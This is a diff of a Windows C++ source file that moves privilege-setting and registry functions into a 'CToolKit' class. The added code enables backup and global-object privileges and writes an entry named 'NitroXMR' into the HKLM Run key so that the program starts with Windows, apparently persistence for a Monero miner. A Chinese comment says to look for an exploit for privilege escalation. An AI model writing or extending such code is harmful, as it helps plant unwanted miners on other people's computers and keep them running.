@@ -1,42 +1,45 @@
 #include "stdafx.h"
-#include "autoRun.h"
+#include "ToolKit.h"
 
 // executePath
 
 //提权的问题找找exp吧
 
-BOOL autoRun()
+BOOL CToolKit::IsKeyEdit()
 {
-	//CRegKey reg;        //定义注册表对象
-
-	//
-	//if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
-	//{
-	//	MessageBox(NULL, L"create!", L"info", MB_OK);
-	//}
-
-	//if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
-	//{
-	//	MessageBox(NULL, L"backup!", L"info", MB_OK);
-	//}
-	//
-	//if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
-	//{
-
-	//	MessageBox(NULL, L"key in", L"info", MB_OK);
-
-	//	reg.Close();
-	//}
-	//else
-	//{
-	//	MessageBox(NULL, L"failed", L"info", MB_OK);
-	//}
+	CRegKey reg;        //定义注册表对象
 
 	
-	return TRUE;
+	if (TRUE == SetPrivilege(SE_CREATE_GLOBAL_NAME, TRUE))
+	{
+		printf("[+] Creat Privilege OK \n");
+	}
+
+	if (TRUE == SetPrivilege(SE_BACKUP_NAME, TRUE))
+	{
+		printf("[+] Backup Privilege OK \n");
+	}
+	
+	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
+	{
+
+		printf("[+] Open Reg OK \n");
+		bKeyEdit = TRUE;
+		reg.Close();
+	}
+	else
+	{
+		bKeyEdit = FALSE;
+		printf("[-] Open Reg Failed\n");
+	}
+
+	
+	return bKeyEdit;
 }
 
-BOOL editReg()
+
+
+BOOL CToolKit::setAutoRun()
 {
 	CString exePath;
 	CRegKey reg;        //定义注册表对象
@@ -53,6 +56,7 @@ BOOL editReg()
 
 	if (ERROR_SUCCESS == reg.Open(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"))
 	{
+		printf("[+] Open Reg OK \n");
 
 		HKEY hKey = reg.m_hKey;
 
@@ -65,16 +69,24 @@ BOOL editReg()
 
 			reg.SetStringValue(L"NitroXMR", executePath);
 
-			MessageBox(NULL, L"key in", L"info", NULL);
+			printf("[+] Write Reg OK\n");
 
+		}
+		else
+		{
+			printf("[-] Write Reg Failed\n");
 		}
 		reg.Close();
 		return TRUE;
 	}
+	else
+	{
+		printf("[-] Open Reg Failed\n");
+	}
 	return FALSE;
 }
 
-BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
+BOOL CToolKit::SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege)
 {
 	HANDLE hToken = NULL;
 	TOKEN_PRIVILEGES tp;
